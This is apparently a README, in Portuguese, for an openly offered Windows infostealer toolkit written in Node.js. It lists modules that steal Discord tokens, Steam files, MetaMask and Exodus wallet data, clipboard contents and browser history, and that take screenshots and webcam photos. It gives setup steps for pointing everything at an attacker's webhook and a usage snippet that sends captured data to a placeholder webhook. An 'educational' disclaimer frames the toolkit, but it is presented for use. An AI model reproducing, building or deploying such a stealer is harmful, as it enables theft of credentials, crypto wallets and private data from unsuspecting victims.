# Stealers Modules

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Node.js](https://img.shields.io/badge/Node.js-16+-green.svg)](https://nodejs.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue.svg)](https://www.microsoft.com/windows)

> **⚠️ DISCLAIMER IMPORTANTE**  
> Este repositório é **APENAS** para fins educacionais e de pesquisa em segurança.  
> O uso deste código para atividades maliciosas é **PROIBIDO** e de responsabilidade exclusiva do usuário.

---

## 📋 Sobre

Diversos módulos para implementação em Stealers. Desenvolvido para fins educacionais em segurança da informação e pentesting.

---

## 🚀 Features

- **Discord**: Coleta tokens e informações de autenticação
- **Steam**: Backup dos arquivos principais da Steam
- **MetaMask & Exodus**: Cópia de dados de carteiras cripto
- **Screenshot**: Captura de tela com envio para webhook
- **Webcam**: Captura de foto da webcam
- **Clipboard**: Captura todos os novos textos copiados pelo usuario e os antigos (caso tenha o win + v ativo)
- **Browser History**: Coleta histórico dos navegadores

---

## 📁 Estrutura

```
make-stealer/
├── index.js             # Arquivo principal
├── package.json         # Dependências
├── readme.MD            # Documentação
└── modulos/             # Módulos do sistema
    ├── clipboard.js     # Coleta clipboard
    ├── browser.js       # Coleta histórico dos navegadores
    ├── discord.js       # Coleta tokens Discord
    ├── steam.js         # Backup Steam
    ├── metamask.js      # Backup MetaMask
    ├── exodus.js        # Backup Exodus
    ├── screenshot.js    # Captura de tela
    └── webcam.js        # Captura webcam
```

---

## ⚙️ Requisitos

- **Sistema**: Windows 10/11
- **Node.js**: Versão 16 ou superior
- **NPM**: Gerenciador de pacotes

---

## 🛠️ Instalação

1. **Clone o repositório**:
   ```bash
   git clone https://github.com/npmstealer/make-stealer.git
   cd make-stealer
   ```

2. **Instale as dependências**:
   ```bash
   npm install
   ```

3. **Configure a webhook**:
   - edite o arquivo `index.js`
   - Substitua o 'webhook here' pela sua webhook

---

## 📦 Dependências

- `axios`: Requisições HTTP
- `screenshot-desktop`: Captura de tela
- `form-data`: Upload de arquivos

---

## 🚀 Como Usar

### Uso Básico
```bash
npm start
# ou
node index.js
```

### Uso dos módulos
```javascript
const { discordtokens } = require('./modulos/discord')
const { screenshot } = require('./modulos/screenshot')

discordtokens()

screenshot('print.png', 'webhook here')
```

---

## ⚖️ Responsabilidade Legal

- Este software é fornecido "como está"
- O uso é de responsabilidade exclusiva do usuário
- Respeite sempre as leis locais de privacidade e segurança
- Use apenas em ambientes autorizados e para fins educacionais

---

## 👤 Créditos

- **Desenvolvedor**: npmstealer
- **Discord**: [discord.gg/npm](https://discord.gg/npm)
- **Versão**: 1.0.0

---

## 📞 Suporte

- **Discord**: [discord.gg/npm](https://discord.gg/npm)
- **Issues**: Use o GitHub Issues para bugs

---

> **⚠️ Lembre-se**: Use este software de forma responsável e ética. A segurança da informação deve sempre respeitar a privacidade e os direitos dos usuários.
